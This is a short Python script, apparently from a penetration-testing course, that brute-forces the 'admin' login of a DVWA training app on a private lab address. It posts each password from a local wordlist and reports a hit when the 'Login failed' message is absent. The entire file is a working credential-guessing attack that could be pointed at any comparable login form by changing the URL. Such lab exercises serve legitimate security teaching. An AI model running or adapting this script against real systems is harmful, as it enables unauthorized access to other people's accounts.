import requests

target_url = "http://10.0.2.11/dvwa/login.php"

data_dict = {
    "username": "admin",
    "password": "",
    "Login": "submit",
}
# response = requests.post(target_url, data=data_dict)
# print(response.content)

with open("/home/zilola/PycharmProjects/kali2/passwords.lst", "r") as file:
    for line in file:
        word = line.strip()
        data_dict["password"] = word
        response = requests.post(target_url, data=data_dict)

        if "Login failed" not in response.content:
            print(f"[+] Got the password --> {word}")
            exit()

print("[+] Reached end of password file")